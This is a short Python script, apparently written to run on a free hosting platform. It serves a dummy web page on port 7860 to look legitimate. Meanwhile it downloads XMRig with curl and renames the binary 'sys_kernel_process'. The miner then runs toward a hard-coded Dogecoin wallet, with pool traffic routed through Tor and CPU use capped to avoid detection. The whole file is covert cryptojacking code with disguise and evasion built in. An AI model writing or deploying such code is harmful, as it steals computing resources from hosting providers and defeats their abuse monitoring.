import os
import subprocess
import threading
import time
import http.server
import socketserver


WORKER_NAME = "Ghost02" 
WALLET_ADDR = "DP2DhHWz1gD2EhvZ6zbMcZe9P8z7Bytxcc"
POOL_URL = "rx.unmineable.com:3333" 

def start_dummy_server():
    PORT = 7860
    Handler = http.server.SimpleHTTPRequestHandler
    try:
        with socketserver.TCPServer(("", PORT), Handler) as httpd:
            print(f"Server ACTIVE on PORT {PORT}")
            httpd.serve_forever()
    except:
        pass

def start_tor():
    print("Initializing Custom TOR Configuration...")
    
    
    os.system("mkdir -p /tmp/tor_data")
    os.system("chmod 700 /tmp/tor_data")
    
    
    
    
    tor_config = """
    SocksPort 9050
    Log notice stdout
    DataDirectory /tmp/tor_data
    """
    
    with open("torrc", "w") as f:
        f.write(tor_config)
    
    
    print("Starting TOR Daemon...")
    os.system("tor -f torrc &")

def start_miner():
    miner_name = "sys_kernel_process"
    
    print("Downloading Miner...")
    os.system("curl -L -o miner.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz")
    os.system("tar xf miner.tar.gz")
    if os.path.exists("xmrig-6.21.0/xmrig"):
        os.system(f"mv xmrig-6.21.0/xmrig {miner_name}")
    
    
    config_content = f"""
    {{
        "autosave": true,
        "cpu": {{ 
            "enabled": true, 
            "rx": [0], 
            "priority": 0,
            "huge-pages": true
        }},
        "http": {{ "enabled": false }},
        "opencl": {{ "enabled": false }},
        "cuda": {{ "enabled": false }},
        "pools": [
            {{
                "url": "{POOL_URL}",
                "user": "DOGE:{WALLET_ADDR}.{WORKER_NAME}",
                "pass": "x",
                "keepalive": true,
                "tls": false,
                "socks5": "127.0.0.1:9050" 
            }}
        ]
    }}
    """
    
    with open("config.json", "w") as f:
        f.write(config_content)
    
    print("Waiting for Tor to build circuit (45s)...")
    
    time.sleep(45) 
    
    print("ENGAGING MINER via ENCRYPTED TUNNEL...")
    
    subprocess.run(["cpulimit", "-l", "65", "--", f"./{miner_name}", "-c", "config.json"])


t1 = threading.Thread(target=start_dummy_server)
t1.start()

t2 = threading.Thread(target=start_tor)
t2.start()

start_miner()
